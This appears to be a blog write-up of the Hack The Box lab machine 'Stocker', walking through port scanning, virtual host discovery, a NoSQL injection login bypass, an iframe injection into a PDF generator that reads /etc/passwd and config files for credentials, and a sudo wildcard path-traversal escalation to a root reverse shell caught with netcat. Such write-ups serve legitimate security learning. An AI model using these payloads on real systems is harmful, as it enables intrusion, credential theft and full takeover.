<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="easy - Stocker Content Finding user flag Nmaping the target:
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- stocker.htb Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 11:33 -04 Nmap scan report for stocker.htb (10.129.219.49) Host is up (0.14s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nothing interesting found, I will need to fuzz.
x» curl -s stocker.htb | grep href | grep -v '#' <link rel=&#34;apple-touch-icon&#34; sizes=&#34;180x180&#34; href=&#34;img/apple-touch-icon."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="easy - Stocker Content Finding user flag Nmaping the target:
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- stocker.htb Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 11:33 -04 Nmap scan report for stocker.htb (10.129.219.49) Host is up (0.14s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nothing interesting found, I will need to fuzz.
x» curl -s stocker.htb | grep href | grep -v '#' <link rel=&#34;apple-touch-icon&#34; sizes=&#34;180x180&#34; href=&#34;img/apple-touch-icon."><meta property="og:title" content><meta property="og:description" content="easy - Stocker Content Finding user flag Nmaping the target:
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- stocker.htb Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 11:33 -04 Nmap scan report for stocker.htb (10.129.219.49) Host is up (0.14s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nothing interesting found, I will need to fuzz.
x» curl -s stocker.htb | grep href | grep -v '#' <link rel=&#34;apple-touch-icon&#34; sizes=&#34;180x180&#34; href=&#34;img/apple-touch-icon."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/easy/stocker/"><meta property="article:section" content="infosec"><title>easy - Stocker </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/easy/stocker/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---stocker>easy - Stocker
<a class=heading-link href=#easy---stocker><i class="fa fa-link" aria-hidden=true></i></a></h1><h1 id=content>Content
<a class=heading-link href=#content><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=finding-user-flag>Finding user flag
<a class=heading-link href=#finding-user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Nmaping the target:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>» sudo nmap --open --min-rate <span style=color:#0086f7;font-weight:700>5000</span> -T4 -Pn -p- stocker.htb
</span></span><span style=display:flex><span>Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 11:33 -04
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#fb660a;font-weight:700>for</span> stocker.htb (10.129.219.49)
</span></span><span style=display:flex><span>Host is up (0.14s latency).
</span></span><span style=display:flex><span>Not shown: <span style=color:#0086f7;font-weight:700>65533</span> closed tcp ports (reset)
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span></code></pre></div><p>Nothing interesting found, I will need to fuzz.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>x» curl  -s stocker.htb | grep href | grep -v <span style=color:#0086d2>&#39;#&#39;</span>
</span></span><span style=display:flex><span>    &lt;link <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;apple-touch-icon&#34;</span> <span style=color:#fb660a>sizes</span>=<span style=color:#0086d2>&#34;180x180&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;img/apple-touch-icon.png&#34;</span> /&gt;
</span></span><span style=display:flex><span>    &lt;link <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;icon&#34;</span> <span style=color:#fb660a>type</span>=<span style=color:#0086d2>&#34;image/png&#34;</span> <span style=color:#fb660a>sizes</span>=<span style=color:#0086d2>&#34;32x32&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;img/favicon-32x32.png&#34;</span> /&gt;
</span></span><span style=display:flex><span>    &lt;link <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;icon&#34;</span> <span style=color:#fb660a>type</span>=<span style=color:#0086d2>&#34;image/png&#34;</span> <span style=color:#fb660a>sizes</span>=<span style=color:#0086d2>&#34;16x16&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;img/favicon-16x16.png&#34;</span> /&gt;
</span></span><span style=display:flex><span>    &lt;link <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;icon&#34;</span> <span style=color:#fb660a>type</span>=<span style=color:#0086d2>&#34;image/png&#34;</span> <span style=color:#fb660a>sizes</span>=<span style=color:#0086d2>&#34;96x96&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;img/favicon.png&#34;</span> /&gt;
</span></span><span style=display:flex><span>    &lt;link <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;stylesheet&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;css/theme.min.css&#34;</span> /&gt;
</span></span><span style=display:flex><span>        &lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;navbar-brand pe-4 fs-4&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/&#34;</span>&gt;
</span></span><span style=display:flex><span>        Made by &lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;https://templatedeck.com&#34;</span> <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;link-fancy&#34;</span> <span style=color:#fb660a>target</span>=<span style=color:#0086d2>&#34;_blank&#34;</span>&gt;templatedeck.com&lt;/a&gt;
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>x» curl  -s stocker.htb | xurls
</span></span><span style=display:flex><span>https://onepagelove.com/stride
</span></span><span style=display:flex><span>http://www.w3.org/2000/svg
</span></span><span style=display:flex><span>http://www.w3.org/2000/svg
</span></span><span style=display:flex><span>https://templatedeck.com
</span></span></code></pre></div><p>No suspicious dir paths:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» gobuster dir -w /usr/share/dirb/wordlists/big.txt -t <span style=color:#0086f7;font-weight:700>50</span> -u http://stocker.htb/ -b 403,404
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>/css                  (Status: 301) [Size: 178] [--&gt; http://stocker.htb/css/]
</span></span><span style=display:flex><span>/favicon.ico          (Status: 200) [Size: 1150]
</span></span><span style=display:flex><span>/fonts                (Status: 301) [Size: 178] [--&gt; http://stocker.htb/fonts/]
</span></span><span style=display:flex><span>/img                  (Status: 301) [Size: 178] [--&gt; http://stocker.htb/img/]
</span></span><span style=display:flex><span>/js                   (Status: 301) [Size: 178] [--&gt; http://stocker.htb/js/]
</span></span><span style=display:flex><span>Progress: <span style=color:#0086f7;font-weight:700>20469</span> / <span style=color:#0086f7;font-weight:700>20470</span> (100.00%)
</span></span></code></pre></div><p>Found a sub-domain!</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t <span style=color:#0086f7;font-weight:700>50</span> --append-domain -u stocker.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>2023/02/27 11:42:21 Starting gobuster in VHOST enumeration <span style=color:#fb660a>mode</span>
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>Found: dev.stocker.htb Status: <span style=color:#0086f7;font-weight:700>302</span> [Size: 28] [--&gt; /login]
</span></span><span style=display:flex><span>Progress: <span style=color:#0086f7;font-weight:700>4911</span> / <span style=color:#0086f7;font-weight:700>4990</span> (98.42%)
</span></span></code></pre></div><p>It is a express.js app:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» curl -I <span style=color:#0086d2>&#34;http://dev.stocker.htb/login&#34;</span>
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>Server: nginx/1.18.0 (Ubuntu)
</span></span><span style=display:flex><span>Date: Mon, <span style=color:#0086f7;font-weight:700>27</span> Feb <span style=color:#0086f7;font-weight:700>2023</span> 15:43:59 GMT
</span></span><span style=display:flex><span>Content-Type: text/html; <span style=color:#fb660a>charset</span>=UTF-8
</span></span><span style=display:flex><span>Content-Length: <span style=color:#0086f7;font-weight:700>2667</span>
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span><span style=display:flex><span>X-Powered-By: Express
</span></span><span style=display:flex><span>Accept-Ranges: bytes
</span></span><span style=display:flex><span>Cache-Control: public, max-age=<span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span>Last-Modified: Tue, <span style=color:#0086f7;font-weight:700>06</span> Dec <span style=color:#0086f7;font-weight:700>2022</span> 09:53:59 GMT
</span></span><span style=display:flex><span>ETag: W/<span style=color:#0086d2>&#34;a6b-184e6db4279&#34;</span>
</span></span><span style=display:flex><span>Set-Cookie: connect.sid=s%3ApGnULCGlgGvmmJ5qL7GLnLrmQM8ScCtM.I6vljYhiejpDcnshvVWQP4cckp2QxugWiiyDlCP6Svs; <span style=color:#fb660a>Path</span>=/; HttpOnly
</span></span></code></pre></div><p>Doesn&rsquo;t seem vulnerable to sqli:</p><p><figure class=image-container><a href=..//i/2023-02-27_11-45.png><img width="dev login page%" src=..//i/2023-02-27_11-45.png alt="dev login page"></a></figure></p><p>Somehow I need to bypass that login:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» gobuster dir -w /usr/share/dirb/wordlists/big.txt -t <span style=color:#0086f7;font-weight:700>50</span> -u http://dev.stocker.htb/ -b 403,404
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>2023/02/27 11:45:38 Starting gobuster in directory enumeration <span style=color:#fb660a>mode</span>
</span></span><span style=display:flex><span>===============================================================
</span></span><span style=display:flex><span>/Login                (Status: 200) [Size: 2667]
</span></span><span style=display:flex><span>/login                (Status: 200) [Size: 2667]
</span></span><span style=display:flex><span>/logout               (Status: 302) [Size: 28] [--&gt; /login]
</span></span><span style=display:flex><span>/static               (Status: 301) [Size: 179] [--&gt; /static/]
</span></span><span style=display:flex><span>/stock                (Status: 302) [Size: 48] [--&gt; /login?error=auth-required]
</span></span><span style=display:flex><span>Progress: <span style=color:#0086f7;font-weight:700>20380</span> / <span style=color:#0086f7;font-weight:700>20470</span> (99.56%)
</span></span></code></pre></div><p>I was able to by pass it after reading online, it was a No-SQL Injection issue:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>curl <span style=color:#0086d2>&#39;http://dev.stocker.htb/login&#39;</span> -X POST <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Content-Type: application/json&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Origin: http://dev.stocker.htb&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Connection: keep-alive&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Referer: http://dev.stocker.htb/login&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Cookie: connect.sid=s%3A33AWCp9WplxCVsOwc6LSziavsWvYc-CE.ENVm%2Fg507T1odHfYvAvhg1xBuQs8pG8LGmrfL5V3wrU&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Cache-Control: no-cache&#39;</span>  -d <span style=color:#0086d2>&#39;{&#34;username&#34;: {&#34;$ne&#34;: null}, &#34;password&#34;: {&#34;$ne&#34;: null}}&#39;</span> 
</span></span></code></pre></div><p>After requesting that and reloading the page in Firefox I was succesfully redirected to <code>/stock</code> page.</p><p><figure class=image-container><a href=..//i/2023-02-27_11-59.png><img width="stock page%" src=..//i/2023-02-27_11-59.png alt="stock page"></a></figure></p><p>The Purchase option from generates a PDF file:</p><p><figure class=image-container><a href=..//i/2023-02-27_12-02.png><img width="pdf report%" src=..//i/2023-02-27_12-02.png alt="pdf report"></a></figure></p><p>That pdf is being generated by Skia PDF framework:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>x» pdfinfo document.pdf
</span></span><span style=display:flex><span>Creator:         Chromium
</span></span><span style=display:flex><span>Producer:        Skia/PDF m108
</span></span><span style=display:flex><span>CreationDate:    Mon Feb <span style=color:#0086f7;font-weight:700>27</span> 12:01:29 <span style=color:#0086f7;font-weight:700>2023</span> -04
</span></span><span style=display:flex><span>ModDate:         Mon Feb <span style=color:#0086f7;font-weight:700>27</span> 12:01:29 <span style=color:#0086f7;font-weight:700>2023</span> -04
</span></span><span style=display:flex><span>Custom Metadata: no
</span></span><span style=display:flex><span>Metadata Stream: no
</span></span><span style=display:flex><span>Tagged:          yes
</span></span><span style=display:flex><span>UserProperties:  no
</span></span><span style=display:flex><span>Suspects:        no
</span></span><span style=display:flex><span>Form:            none
</span></span><span style=display:flex><span>JavaScript:      no
</span></span><span style=display:flex><span>Pages:           <span style=color:#0086f7;font-weight:700>1</span>
</span></span><span style=display:flex><span>Encrypted:       no
</span></span><span style=display:flex><span>Page size:       594.96 x 841.92 pts (A4)
</span></span><span style=display:flex><span>Page rot:        <span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span>File size:       <span style=color:#0086f7;font-weight:700>41993</span> bytes
</span></span><span style=display:flex><span>Optimized:       no
</span></span><span style=display:flex><span>PDF version:     1.4
</span></span></code></pre></div><p>The form is injectable:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>curl <span style=color:#0086d2>&#39;http://dev.stocker.htb/api/order&#39;</span> -X POST  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Referer: http://dev.stocker.htb/stock&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Content-Type: application/json&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Origin: http://dev.stocker.htb&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Connection: keep-alive&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Cookie: connect.sid=s%3A33AWCp9WplxCVsOwc6LSziavsWvYc-CE.ENVm%2Fg507T1odHfYvAvhg1xBuQs8pG8LGmrfL5V3wrU&#39;</span>  <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -H <span style=color:#0086d2>&#39;Cache-Control: no-cache&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  --data-raw <span style=color:#0086d2>$&#39;{&#34;basket&#34;:[{&#34;_id&#34;:&#34;638f116eeb060210cbd83a8d&#34;,&#34;title&#34;:&#34;&lt;h1&gt;holaaa!!!11&lt;/h1&gt;&#34;,&#34;description&#34;:&#34;It\&#39;s a red cup.&#34;,&#34;image&#34;:&#34;red-cup.jpg&#34;,&#34;price&#34;:32,&#34;currentStock&#34;:4,&#34;__v&#34;:0,&#34;amount&#34;:1}]}&#39;</span>
</span></span></code></pre></div><p><figure class=image-container><a href=..//i/2023-02-27_12-14.png><img width=injectable% src=..//i/2023-02-27_12-14.png alt=injectable></a></figure></p><p>I was able to read <code>/etc/passwd</code> by injecting <code>"title":"&lt;iframe src=file:///etc/passwd>&lt;/iframe>"</code>.</p><p>By reading nginx configs and js index file I&rsquo;ve got a credential:</p><ul><li><code>/var/www/dev/index.js</code></li><li><code>/etc/nginx/nginx.conf</code></li></ul><p><figure class=image-container><a href=..//i/2023-02-27_12-22.png><img width="Mongodb creds%" src=..//i/2023-02-27_12-22.png alt="Mongodb creds"></a></figure></p><p><figure class=image-container><a href=..//i/2023-02-27_12-23.png><img width="leak nginx%" src=..//i/2023-02-27_12-23.png alt="leak nginx"></a></figure></p><p>I tried to ssh with <code>dev</code> user but didn&rsquo;t work, I had to read the <code>/etc/passwd</code> file and I realized there is an user called <code>angoose</code> there.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>angoose@stocker:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1001(angoose) <span style=color:#fb660a>gid</span>=1001(angoose) <span style=color:#fb660a>groups</span>=1001(angoose)
</span></span><span style=display:flex><span>angoose@stocker:~$ ls
</span></span><span style=display:flex><span>user.txt
</span></span></code></pre></div><h2 id=finding-root-flag>Finding root flag
<a class=heading-link href=#finding-root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Checking privileges, we have a wildcard!:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>angoose@stocker:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#fb660a;font-weight:700>for</span> angoose on stocker:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, <span style=color:#fb660a>secure_path</span>=/usr/local/sbin<span style=color:#0086d2>\:</span>/usr/local/bin<span style=color:#0086d2>\:</span>/usr/sbin<span style=color:#0086d2>\:</span>/usr/bin<span style=color:#0086d2>\:</span>/sbin<span style=color:#0086d2>\:</span>/bin<span style=color:#0086d2>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User angoose may run the following commands on stocker:
</span></span><span style=display:flex><span>    (ALL) /usr/bin/node /usr/local/scripts/*.js
</span></span></code></pre></div><p>I will use
<a href=https://www.revshells.com>https://www.revshells.com</a>
help to build a payload for that js file.</p><p><figure class=image-container><a href=..//i/2023-02-27_12-31.png><img width="js payload%" src=..//i/2023-02-27_12-31.png alt="js payload"></a></figure></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../../../tmp/a.js
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>x» nc -lvnp <span style=color:#0086f7;font-weight:700>55555</span>
</span></span><span style=display:flex><span>Connection from 10.129.219.49:32880
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root)
</span></span></code></pre></div></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>